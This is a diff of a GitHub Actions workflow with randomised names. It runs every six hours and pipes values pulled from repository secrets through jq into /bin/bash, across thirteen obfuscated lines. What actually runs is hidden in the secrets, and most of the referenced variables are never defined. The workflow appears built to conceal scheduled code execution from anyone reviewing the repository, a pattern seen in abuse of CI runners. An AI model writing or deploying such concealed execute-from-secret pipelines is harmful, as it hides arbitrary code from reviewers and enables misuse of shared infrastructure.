@@ -1,8 +1,9 @@
 name: taoshiwang1234
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 5/6 * * *'
+    - cron: '49 0/6 * * *'
 
 jobs:
   build:
@@ -12,18 +13,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: taoshiwang1234
         env:
-          pqwjf1: ${{ secrets.pqwjf1 }}
+          pr681: ${{ secrets.pr681 }}
         run: |
-          echo $pqwjf1 | jq -r .ur98040 | /bin/bash
-          echo $j743 | jq -r .dab0991 | /bin/bash
-          echo $rkk1801 | jq -r .b31 | /bin/bash
-          echo $sc2 | jq -r .ena84 | /bin/bash
-          echo $dh15138 | jq -r .qnci49659 | /bin/bash
-          echo $zh643 | jq -r .i81 | /bin/bash
-          echo $n9 | jq -r .d19 | /bin/bash
-          echo $wznp6943 | jq -r .do5 | /bin/bash
-          echo $nkbad9 | jq -r .hrrya05290 | /bin/bash
-          echo $cc05 | jq -r .nshso77344 | /bin/bash
-          echo $a5434 | jq -r .xpjr4588 | /bin/bash
-          echo $p192 | jq -r .u352 | /bin/bash
+          echo $pr681 | jq -r .ylpv8034 | /bin/bash
+          echo $djt1 | jq -r .vnn85550 | /bin/bash
+          echo $vik0 | jq -r .nh50383 | /bin/bash
+          echo $cgf6 | jq -r .gz493 | /bin/bash
+          echo $xir0462 | jq -r .p6258 | /bin/bash
+          echo $yh80 | jq -r .ai951 | /bin/bash
+          echo $aznu24314 | jq -r .vi0 | /bin/bash
+          echo $bb7 | jq -r .mibhb32 | /bin/bash
+          echo $tzr4254 | jq -r .n35 | /bin/bash
+          echo $zbljz7 | jq -r .o6502 | /bin/bash
+          echo $sjby625 | jq -r .l574 | /bin/bash
+          echo $wnw41755 | jq -r .c5510 | /bin/bash
+          echo $kovw915 | jq -r .kqfz2209 | /bin/bash
 
